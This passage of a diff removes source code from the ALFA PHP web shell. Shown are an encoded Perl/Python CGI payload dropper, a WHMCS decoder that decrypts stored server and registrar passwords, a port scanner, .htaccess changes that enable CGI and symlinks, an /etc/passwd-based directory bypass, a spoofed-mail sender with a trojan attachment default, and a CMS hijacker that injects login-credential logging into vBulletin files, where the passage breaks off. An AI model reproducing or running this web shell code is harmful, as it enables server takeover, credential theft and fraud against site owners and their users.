sXZzJfpus97HI2bM6NimQ0oo3ZWD6/S7+USkZiBg65/9GhEHw/juYcdpur76eM3MUFnFvg5VdIAJUBQCQSQk6ARA2Fcw8+7K1Or2M4p1WDJWToPxoqm9eAa+D0SG5cc+2FHqjbNatJUKASduszhiV55d3yVbEiORCTGM6IX7lTzBjYHhiZWZ7BxrfML3JWMlxvWtsrOPteOm1vuC4PLo7PJ9Oz/dMxHDNru73CGF+8G19sMZqna1Jex9iaTN0ShIdW7aKISmUcEjDcFtOZuJyVp2kfr8C0xqD9AFaAWPJSoIH6QV1ufsCTdGMN40XFwbyhAl4TvHezJ37gZk/xxgkvz2CwgBOivO75LoF9n0LGv3lFqi5oOzWovdHehMEDR4nKPdQPiFuv6S6F6qtY4aKSWwGV+V9xjWT8wbQ3rXsnHLy/wXvfv9RRth3DfVFPjhqmLO73WuIw4J/KBqGGQ5xmBn0cx/SRGD+k5YOHuomaMUUDqgKybUCySYOI0TD5tqjGYFoKL4dKksY3maP3uzrJEphJ/CWDoqKLygCiRTqorMaMUqdPc92qLqvKBPiLcawbU0+Pen3QLo9frfX9k4tTcQ3qtprb35b14ytFQd0of/EfDcD2s9Or8g3v6chnaouLKwWUmLvbemPi0SdkxrCxPgJWU3XgxRvQ1I1MvE1VCaBN8QC7AWndRnGsMlJo+GU13GzKFLLK+JQxtpLaSEbt1lfHJLt1b1Kz/w8wblS+FRoAAA==")));';;
-$py = '#!/usr/bin/python'."\nimport zlib, base64\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
-if($_POST['alfa1']=='perl'){$code = $perl;}else{$code = $py;}
-if(__write_file($name,$code)){
-@chmod($name,0755);
-echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgialfa/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
-}
-}
-echo $div;
-alfafooter();
-}
-function alfaWhmcs(){
-alfahead();
-echo '<div class=header>';
-function decrypt($string,$cc_encryption_hash){
-$key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
-$hash_key = _hash($key);
-$hash_length = strlen ($hash_key);
-$string = __ZGVjb2Rlcg($string);
-$tmp_iv = substr ($string, 0, $hash_length);
-$string = substr ($string, $hash_length, strlen ($string) - $hash_length);
-$iv = $out = '';
-$c = 0;
-while ($c < $hash_length)
-{
-$iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
-++$c;
-}
-$key = $iv;
-$c = 0;
-while ($c < strlen ($string))
-{
-if (($c != 0 AND $c % $hash_length == 0))
-{
-$key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
-}
-$out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
-++$c;
-}
-return $out;
-}
-function _hash($string)
-{
-if(function_exists('sha1'))
-{
-$hash = sha1 ($string);
-}
-else
-{
-$hash = md5 ($string);
-}
-$out = '';
-$c = 0;
-while ($c < strlen ($hash))
-{
-$out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
-$c += 2;
-}
-return $out;
-}
-AlfaNum(8,9,10);
-echo "<center><br><div class='txtfont_header'>| WHMCS DeCoder |</div><p>".getConfigHtml('whmcs')."</p><form onsubmit=\"g('Whmcs',null,this.form_action.value,'decoder',this.db_username.value,this.db_password.value,this.db_name.value,this.cc_encryption_hash.value,this.db_host.value); return false;\">
-<input type='hidden' name='form_action' value='2'>";
-$table = array('td1' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
- 'td2' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
- 'td3' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50'),
- 'td4' =>
- array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
- 'td5' =>
- array('color' => 'FFFFFF', 'tdName' => 'cc_encryption_hash : ', 'inputName' => 'cc_encryption_hash', 'id' => 'cc_encryption_hash', 'inputValue' => '', 'inputSize' => '50')
-);
-create_table($table);
-echo "<p><input type='submit' value=' ' name='Submit'></p></form></center>";
-if($_POST['alfa5']!=''){
-$db_host=($_POST['alfa7']);
-$db_username=($_POST['alfa3']);
-$db_password=($_POST['alfa4']);
-$db_name=($_POST['alfa5']);
-$cc_encryption_hash=($_POST['alfa6']);
-echo __pre();
-$conn=@mysqli_connect($db_host,$db_username,$db_password,$db_name) or die(mysqli_error($conn));
-$query = mysqli_query($conn,"SELECT * FROM tblservers");
-$num = mysqli_num_rows($query);
-if ($num > 0){
-for($i=0; $i <=$num-1; $i++){
-$v = @mysqli_fetch_array($query);
-$ipaddress = $v['ipaddress'];
-$username = $v['username'];
-$type = $v['type'];
-$active = $v['active'];
-$hostname = $v['hostname'];
-echo("<center><table border='1'>");
-$password = decrypt ($v['password'], $cc_encryption_hash);
-echo("<tr><td><b><font color=\"#FFFFFF\">Type</font></td><td>$type</td></tr></b>");
-echo("<tr><td><b><font color=\"#FFFFFF\">Active</font></td><td>$active</td></tr></b>");
-echo("<tr><td><b><font color=\"#FFFFFF\">Hostname</font></td><td>$hostname</td></tr></b>");
-echo("<tr><td><b><font color=\"#FFFFFF\">Ip</font></td><td>$ipaddress</td></tr></b>");
-echo("<tr><td><b><font color=\"#FFFFFF\">Username</font></td><td>$username</td></tr></b>");
-echo("<tr><td><b><font color=\"#FFFFFF\">Password</font></td><td>$password</td></tr></b>");
-echo "</table><br><br></center>";
-}
-$query1 = @mysqli_query($conn,"SELECT * FROM tblregistrars");
-$num1 = @mysqli_num_rows($query1);
-if ($num1 > 0){
-for($i=0; $i <=$num1 -1; $i++){
-$v = mysqli_fetch_array($query1);
-$registrar = $v['registrar'];
-$setting = $v['setting'];
-$value = decrypt($v['value'], $cc_encryption_hash);
-if ($value==""){
-$value=0;
-}
-echo("<center>Domain Reseller <br><center>");
-echo("<center><table border='1'>");
-echo("<tr><td><b><font color=\"#67ABDF\">Register</font></td><td>$registrar</td></tr></b>");
-echo("<tr><td><b><font color=\"#67ABDF\">Setting</font></td><td>$setting</td></tr></b>");
-echo("<tr><td><b><font color=\"#67ABDF\">Value</font></td><td>$value</td></tr></b>");
-echo "</table><br><br></center>";
-}
-}
-}else{__alert('<font color="red">tblservers is Empty...!</font>');};
-}
-echo "</div>";
-alfafooter();
-}
-function alfaportscanner(){
-alfahead();
-echo '<div class=header><center><p><div class="txtfont_header">| Port Scaner |</div></p>
-<form action="" method="post" onsubmit="g(\'portscanner\',null,null,this.start.value,this.end.value,this.host.value); return false;">
-<input type="hidden" name="y" value="phptools">
-<div class="txtfont">Host: </div> <input id="text" type="text" name="host" value="localhost"/>
-<div class="txtfont">Port start: </div> <input id="text" size="5" type="text"  name="start" value="80"/>
-<div class="txtfont">Port end: </div> <input id="text" size="5" type="text" name="end" value="80"/> <input type="submit" value=" " />
-</form></center><br>';
-$start = strip_tags($_POST['alfa2']);
-$end = strip_tags($_POST['alfa3']);
-$host = strip_tags($_POST['alfa4']);
-if(isset($_POST['alfa4']) && is_numeric($_POST['alfa3']) && is_numeric($_POST['alfa2'])){
-echo __pre();
-$packetContent = "GET / HTTP/1.1\r\n\r\n";
-if(ctype_xdigit($packetContent))$packetContent = @pack("H*" , $packetContent);
-else{
-$packetContent = str_replace(array("\r","\n"), "", $packetContent);
-$packetContent = str_replace(array("\\r","\\n"), array("\r", "\n"), $packetContent);
-}
-for($i = $start; $i<=$end; $i++){
-$sock = @fsockopen($host, $i, $errno, $errstr, 3);
-if($sock){
-stream_set_timeout($sock, 5);
-fwrite($sock, $packetContent."\r\n\r\n\x00");
-$counter = 0;
-$maxtry = 1;
-$bin = "";
-do{
-$line = fgets($sock, 1024);
-if(trim($line)=="")$counter++;
-$bin .= $line;
-}while($counter<$maxtry);
-fclose($sock);
-echo "<center><p>Port <font style='color:#DE3E3E'>$i</font> is open</p>";
-echo "<p><textarea style='height:140px;width:50%;'>".$bin."</textarea></p></center>";
-}
-flush();
-}
-}
-echo '</div>';
-alfafooter();
-}
-function alfacgihtaccess($m,$d='', $symname=false){
-$readme = "";
-if($symname){$readme="\nReadmeName ".trim($symname);}
-if($m=='cgi'){
-$code = "#Coded By Sole Sad & Invisible\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .alfa\nAddHandler cgi-script .alfa";
-}elseif($m=='sym'){
-$code = "#Coded By Sole Sad & Invisible\nOptions Indexes FollowSymLinks\nDirectoryIndex solevisible.phtm\nAddType text/plain php html php4 phtml\nAddHandler text/plain php html php4 phtml{$readme}\nOptions all";
-}elseif($m=='shtml'){
-$code = "Options +Includes\nAddType text/html .shtml\nAddHandler server-parsed .shtml";
-}
-@__write_file($d . ".htaccess", $code);
-}
-function alfabasedir(){
-alfahead();
-echo '<div class=header>
-<center><p><div class="txtfont_header">| Open Base Dir |</div></p></center>';
-$passwd = _alfa_file('/etc/passwd');
-if(is_array($passwd)){
-$users = array();
-$makepwd = alfaMakePwd();
-$basedir = @ini_get('open_basedir');
-$safe_mode = @ini_get('safe_mode');
-if(_alfa_can_runCommand(true,false)&&($basedir||$safe_mode)){
-$bash = "fZBPSwMxEMXPzacYx9jugkvY9lbpTQ9eFU9NWdYk2wYkWZKsgmu+u9NaS8E/cwgDL/N+M+/yQjxbJ+KO3d4/rHjNusGpZL2DmEITTP/SKlOUIwOqNVTvgLxG2MB0CsGkITioz7X5P9riN60hzhHTvLYn5IoXfbAudYBXUUqHX9wPiEZDZQCj4OM807PIYovlwevHxPiHe0aWmVE7f7BaS4Ws8wEsWAe8UEOCSi+h6moQJinRtzG+6fIGtGeTp8c7Cqo4i4dAFB7xxiGakPdgSxtN6OxA/X7gePk3UtIPiddMe2dOe8wQN7NP";
-$tmp_path = alfaWriteTocgiapi("basedir.alfa",$bash);
-$bash_users  = alfaEx("cd ".$tmp_path."/alfacgiapi;sh basedir.alfa ".$makepwd,false,true,true);
-$users = json_decode($bash_users, true);
-$x=count($users);
-if($x>=2){array_pop($users);--$x;}
-}
-if(!$basedir&&!$safe_mode){
-$x=0;
-foreach($passwd as $str){
-$pos = strpos($str,':');
-$username = substr($str,0,$pos);
-$dirz = str_replace("{user}", $username, $makepwd);
-if(($username != '')){
-if (@is_readable($dirz)){
-array_push($users,$username);
-$x++;
-}}}
-}
-echo '<br><br>';
-echo "<b><font color=\"#00A220\">[+] Founded ".sizeof($passwd)." entrys in /etc/passwd\n"."<br /></font></b>";
-echo "<b><font color=\"#FFFFFF\">[+] Founded ".$x." readable ".str_replace("{user}", "*", $makepwd)." directories\n"."<br /></font></b>";
-echo "<b><font color=\"#FF0000\">[~] Searching for passwords in config files...\n\n"."<br /><br /><br /></font></b>";
-foreach($users as $user){
-if(empty($user))continue;
-$path = str_replace("{user}", $user, $makepwd);
-echo "<form method=post onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span><font color=#27979B>Change Dir <font color=#FFFF01>..:: </font><font color=red><b>$user</b></font><font color=#FFFF01> ::..</font></font></span><br><input class='foottable' type=text name=c value='$path'><input type=submit value='>>'></form><br>";
-}
-}else{echo('<b> <center><font color="#FFFFFF">[-] Error : coudn`t read /etc/passwd [-]</font></center></b>');}
-echo '<br><br></b>';
-echo '</div>';
-alfafooter();
-}
-function alfamail(){
-alfahead();
-echo '<div class=header>';
-AlfaNum(8,9,10);
-echo '<center><p><div class="txtfont_header">| Fake Mail |</div></p><form action="" method="post" onsubmit="g(\'mail\',null,this.mail_to.value,this.mail_from.value,this.mail_subject.value,\'>>\',this.mail_content.value,this.count_mail.value,this.mail_attach.value); return false;">';
-$table = array(
-'td1' => array('color' => 'FFFFFF', 'tdName' => 'Mail To : ', 'inputName' => 'mail_to', 'inputValue' => 'target@fbi.gov', 'inputSize' => '60','placeholder' => true),
-'td2' => array('color' => 'FFFFFF', 'tdName' => 'From : ', 'inputName' => 'mail_from', 'inputValue' => 'sec@google.com', 'inputSize' => '60', 'placeholder' => true),
-'td3' => array('color' => 'FFFFFF', 'tdName' => 'Subject : ', 'inputName' => 'mail_subject', 'inputValue' => 'your site hacked by me', 'inputSize' => '60'),
-'td4' => array('color' => 'FFFFFF', 'tdName' => 'Attach File : ', 'inputName' => 'mail_attach', 'inputValue' => $GLOBALS['cwd'].'trojan.exe', 'inputSize' => '60'),
-'td5' => array('color' => 'FFFFFF', 'tdName' => 'Count Mail : ', 'inputName' => 'count_mail', 'inputValue' => '1', 'inputSize' => '60')
-);
-create_table($table);
-echo '<p><div class="txtfont">Message:</div></p><textarea rows="6" cols="60" name="mail_content">Hi Dear Admin :)</textarea><p><input type="submit" value=" " name="mail_send" /></p></form></center>';
-if(isset($_POST['alfa4'])&&($_POST['alfa4'] == '>>')){
-$mail_to = $_POST['alfa1'];
-$mail_from = $_POST['alfa2'];
-$mail_subject = $_POST['alfa3'];
-$mail_content = $_POST['alfa5'];
-$count_mail = (int)$_POST['alfa6'];
-$mail_attach = $_POST['alfa7'];
-if(filter_var($mail_to, FILTER_VALIDATE_EMAIL)){
-if(!empty($mail_attach)&&@is_file($mail_attach)){
-$file =$mail_attach;
-$content = __read_file($file);
-$content = chunk_split(__ZW5jb2Rlcg($content));
-$uid = md5(uniqid(time()));
-$filename = basename($file);
-$headers  = "From: ".$mail_from." <".$mail_from.">\r\n";
-$headers .= "To: " . $mail_to. " ( ".$mail_to." ) \r\n";
-$headers .= "Reply-To: ".$mail_from."\r\n";
-$headers .= "Content-Type: multipart/mixed; boundary=\"".$uid."\"\r\n\r\n";
-$headers .= 'MIME-Version: 1.0' . "\r\n";
-$headers .= 'X-Mailer: php' . "\r\n";
-$mail_content  = "--".$uid."\r\n";
-$mail_content .= "Content-type:text/plain; charset=iso-8859-1\r\n";
-$mail_content .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
-$mail_content .= $mail_content."\r\n\r\n";
-$mail_content .= "--".$uid."\r\n";
-$mail_content .= "Content-Type: application/octet-stream; name=\"".$filename."\"\r\n";
-$mail_content .= "Content-Transfer-Encoding: base64\r\n";
-$mail_content .= "Content-Disposition: attachment; filename=\"".$filename."\"\r\n\r\n";
-$mail_content .= $content."\r\n\r\n";
-$mail_content .= "--".$uid."--";
-}else{
-$headers  = "From: " . $mail_from. " ( ".$mail_from." ) \r\n";
-$headers .= "To: " . $mail_to. " ( ".$mail_to." ) \r\n";
-$headers .= 'Reply-To: '.$mail_from.'' . "\r\n";
-$headers .= 'Content-type: text/html; charset=utf-8' . "\r\n";
-$headers .= 'MIME-Version: 1.0' . "\r\n";
-$headers .= 'X-Mailer: php' . "\r\n";
-}
-if(empty($count_mail)||$count_mail<1)$count_mail=1;
-if(!empty($mail_from)){echo __pre();
-for($i=1;$i<=$count_mail;$i++){
-if(@mail($mail_to,$mail_subject,$mail_content,$headers))echo("<center>Sent -> $mail_to<br></center>");
-}}else{__alert("Invalid Mail From !");}
-}else{__alert("Invalid Mail To !");}
-}
-echo('</div>');
-alfafooter();
-}
-function alfaziper(){
-alfahead();
-AlfaNum(8,9,10);
-echo '<div class=header><p><center><p><div class="txtfont_header">| Compressor |</div></p>
-<form onSubmit="g(\'ziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
-<div class="txtfont">Dir/File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['alfa3'])?htmlspecialchars($_POST['alfa3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
-<div class="txtfont">Save Dir: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'alfa.zip" size="60"/>
-<input type="submit" value=" " name="ziper" />
-</form></center></p>';
-if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
-$dirzip = $_POST['alfa3'];
-$zipfile = $_POST['alfa4'];
-if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
-alfaEx("powershell Compress-Archive -Path '".addslashes($dirzip)."' -DestinationPath '".addslashes(basename($zipfile))."'");
-echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
-}elseif($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
-alfaEx("cd '".addslashes(dirname($zipfile))."';zip -r '".addslashes(basename($zipfile))."' '".addslashes($dirzip)."'");
-echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
-}elseif(class_exists('ZipArchive')){
-if(__alfaziper($dirzip, $zipfile)){
-echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font></p></center>';
-}else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
-}
-}
-echo '</div>';
-alfafooter();
-}
-function __alfaziper($source,$destination){
-	if(!extension_loaded('zip')||!file_exists($source)){
-		return false;
-	}
-	$zip=new ZipArchive();
-	if(!$zip->open($destination,ZIPARCHIVE::CREATE)){
-		return false;
-	}
-	$source=str_replace('\\','/',realpath($source));
-	if(is_dir($source)===true){
-		$files=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source),RecursiveIteratorIterator::SELF_FIRST);
-		foreach($files as $file){
-			$file=str_replace('\\','/',$file);
-			if(in_array(substr($file,strrpos($file,'/')+1),array('.','..')))continue;
-			$file=realpath($file);
-			if(is_dir($file)===true){
-				$zip->addEmptyDir(str_replace($source.'/','',$file.'/'));
-			}else if(is_file($file)===true){
-				$zip->addFromString(str_replace($source.'/','',$file),file_get_contents($file));
-			}
-		}
-	}else if(is_file($source)===true){
-		$zip->addFromString(basename($source),file_get_contents($source));
-	}
-	return $zip->close();
-}
-function alfadeziper(){
-alfahead();
-AlfaNum(8,9,10);
-echo '<div class=header><p><center><p><div class="txtfont_header">| DeCompressor |</div></p>
-<form onSubmit="g(\'deziper\',null,null,null,this.dirzip.value,this.zipfile.value,\'>>\');return false;" method="post">
-<div class="txtfont">File: </div> <input type="text" name="dirzip" value="'.(!empty($_POST['alfa3'])?htmlspecialchars($_POST['alfa3']):htmlspecialchars($GLOBALS['cwd'])).'" size="60"/>
-<div class="txtfont">Extract To: </div> <input type="text" name="zipfile" value="'.$GLOBALS['cwd'].'" size="60"/>
-<input type="submit" value=" " name="ziper" />
-</form></center></p>';
-if(isset($_POST['alfa5']) && ($_POST['alfa5'] == '>>')){
-$dirzip = $_POST['alfa3'];
-$zipfile = $_POST['alfa4'];
-if(@!is_dir($zipfile)){
-	@mkdir($zipfile, 0777, true);
-}
-$finfo = "";
-$file_type = "";
-if(function_exists('finfo_open')){
-$finfo = @finfo_open(FILEINFO_MIME_TYPE);
-$file_type = @finfo_file($finfo, $dirzip);
-@finfo_close($finfo);
-}else{
-	if($GLOBALS['sys']=='unix'&&_alfa_can_runCommand(true,true)){
-		$file_type = alfaEx('file -b --mime-type ' . $dirzip);
-	}
-}
-if($GLOBALS['sys']!='unix'&&_alfa_can_runCommand(true,true)){
-alfaEx("powershell expand-archive -path '".addslashes($dirzip)."' -destinationpath '".addslashes(basename($zipfile))."'");
-echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font></b></p></center>';
-}elseif($GLOBALS['sys']=='unix'&&!empty($file_type)&&_alfa_can_runCommand(true,true)&&(strlen(alfaEx('which unzip')) > 0||strlen(alfaEx('which tar')) > 0||strlen(alfaEx('which gunzip')) > 0)){
-switch ($file_type) {
-	case 'application/zip':
-		alfaEx("cd '".addslashes($zipfile)."';unzip '".addslashes($dirzip)."'");
-	break;
-	case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
-		if(strstr(basename($dirzip), ".tar.gz")||strstr(basename($dirzip), ".tar")){
-			alfaEx("cd '".addslashes($zipfile)."';tar xzf '".addslashes($dirzip)."'");
-		}else{
-			alfaEx("cd '".addslashes($zipfile)."';gunzip '".addslashes($dirzip)."'");
-		}
-	break;
-}
-echo __pre().'<center><p>Done -> <b><font color="green">'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></b></p></center>';
-}elseif(class_exists('ZipArchive')){
-	$itsok = false;
-	if(emtpy($file_type)){
-		$file_type = "application/zip";
-	}
-	switch ($file_type) {
-		case 'application/zip':
-			$zip = new ZipArchive;
-			$res = $zip->open($dirzip);
-			if ($res) {
-				$zip->extractTo($zipfile);
-				$zip->close();
-				$itsok = true;
-			}
-		break;
-		case 'application/x-tar': case 'application/x-gzip': case 'application/x-gtar':
-			if(strstr(basename($dirzip), ".tar.gz")){
-				$new_file = $zipfile .'/'. basename($dirzip);
-				@copy($dirzip, $new_file);
-				$new_tar = str_replace(".tar.gz", ".tar", $new_file);
-				try {
-					$p = new PharData($new_file);
-					$p->decompress();
-					$phar = new PharData($new_tar);
-					$phar->extractTo($zipfile);
-					@unlink($new_file);
-					@unlink($new_tar);
-					$itsok = true;
-				} catch (Exception $e) {
-				}
-			}else{
-				try {
-					$phar = new PharData($dirzip);
-					$phar->extractTo($zipfile);
-					$itsok = true;
-				} catch (Exception $e) {
-				}
-			}
-		break;
-	}
-if($itsok){
-echo __pre().'<center><p><font color="green">Success...!<br>'.$zipfile.'</font> <a style="cursor:pointer;" onclick="g(\'FilesMan\',\''.$zipfile.'\');">[ View Folder ]</a></p></center>';
-}else{echo __pre().'<center><p><font color="red">ERROR!!!...</font></p></center>';}
-}
-}
-echo '</div>';
-alfafooter();
-}
-function alfacmshijacker(){
-alfahead();
-AlfaNum(5,6,7,8,9,10);
-echo '<div class=header><br>
-<center><div class="txtfont_header">| Cms Hijacker |</div><br><br><form onSubmit="g(\'cmshijacker\',null,this.cmshi.value,this.saveto.value,\'>>\',this.cmspath.value);return false;" method=\'post\'>
-<div class="txtfont">CMS: <select style="width:100px;" name="cmshi">';
-$cm_array = array("vb"=>"vBulletin","wp"=>"wordpress","jom"=>"joomla","whmcs"=>"whmcs","mybb"=>"mybb","ipb"=>"ipboard","phpbb"=>"phpbb");
-foreach($cm_array as $key=>$val)echo '<option value="'.$key.'">'.$val.'</option>';
-echo("</select>");
-echo ' Path installed cms: <input size="50" type="text" name="cmspath" placeholder="ex: /home/user/public_html/vbulletin/">
-SaveTo: <input size="50" type="text" name="saveto" value="'.$GLOBALS['cwd'].'alfa.txt"></font>
-<input type="submit" name="btn" value=" "></form></center><br>';
-$cms = $_POST['alfa1'];
-$saveto = $_POST['alfa2'];
-$cmspath = $_POST['alfa4'];
-if(!empty($cms) AND !empty($saveto) AND $_POST['alfa4'] AND $_POST['alfa3'] == '>>'){
-echo __pre();
-alfaHijackCms($cms,$cmspath,$saveto);
-}
-echo '</div>';
-alfafooter();
-}
-function alfaHijackCms($cms,$cmspath,$saveto){
-switch($cms){
-case "vb":
-hijackvBulletin($cmspath,$saveto);
-break;
-case "wp":
-hijackwp($cmspath,$saveto);
-break;
-case "jom":
-hijackJoomla($cmspath,$saveto);
-break;
-case "whmcs":
-hijackWhmcs($cmspath,$saveto);
-break;
-case "mybb":
-hijackMybb($cmspath,$saveto);
-break;
-case "ipb":
-hijackIPB($cmspath,$saveto);
-break;
-case "phpbb":
-hijackPHPBB($cmspath,$saveto);
-break;
-default:
-echo "error!";
-break;
-}
-}
-function hijackvBulletin($path,$saveto){
-$code='$alfa_username = strtolower($vbulletin->GPC["vb_login_username"]);$alfa_password = $vbulletin->GPC["vb_login_password"];$alfa_file = "{saveto_path}";$sql_query = $vbulletin->db->query_read("SELECT * FROM " . TABLE_PREFIX . "user WHERE `username`=\'" . $alfa_username . "\'");while($row = $vbulletin->db->fetch_array($sql_query)){if(strlen($alfa_password) > 1 AND strlen($alfa_username) > 1){$fp1 = @fopen($alfa_file, "a+");@fwrite($fp1, $alfa_username . \' : \' .  $alfa_password." (" . $row["email"] . ")\n");@fclose($fp1); $f = @file($alfa_file);$new = array_unique($f);$fp = @fopen($alfa_file, "w");foreach($new as $values){@fputs($fp, $values);}@fclose($fp);}}';
-$clearpw = 'defined(\'DISABLE_PASSWORD_CLEARING\')';
-$code=str_replace('{saveto_path}',$saveto,$code);
-$login = $path."/login.php";
-$class = $path."/includes/class_bootstrap.php";
-$dologin = 'do_login_redirect();';
-$evil_login = "\t".$code."\n\t".$dologin;
-$evil_class = "true";
-if((@is_file($login) AND @is_writable($login)) || (@is_file($class) AND @is_writable($class))){
-$data_login = @file_get_contents($login);
-$data_class = @file_get_contents($class);
